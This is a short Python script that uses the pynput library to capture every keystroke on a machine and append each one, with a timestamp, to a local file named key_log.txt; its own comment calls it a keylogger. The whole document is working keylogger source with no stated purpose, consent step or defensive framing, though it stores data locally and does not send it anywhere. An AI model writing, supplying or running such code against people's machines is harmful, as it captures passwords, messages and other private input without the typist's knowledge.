from pynput.keyboard import Listener
from datetime import datetime

# Define the file to save the keystrokes
log_file = "key_log.txt"

# Define the function to be called on each key press
def on_press(key):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    try:
        with open(log_file, "a") as f:
            f.write(f"{timestamp} - {key.char}\n")
    except AttributeError:
        # Handle special keys (e.g., shift, ctrl, etc.)
        with open(log_file, "a") as f:
            f.write(f"{timestamp} - [{key}]\n")

# Start the keylogger
with Listener(on_press=on_press) as listener:
    listener.join()
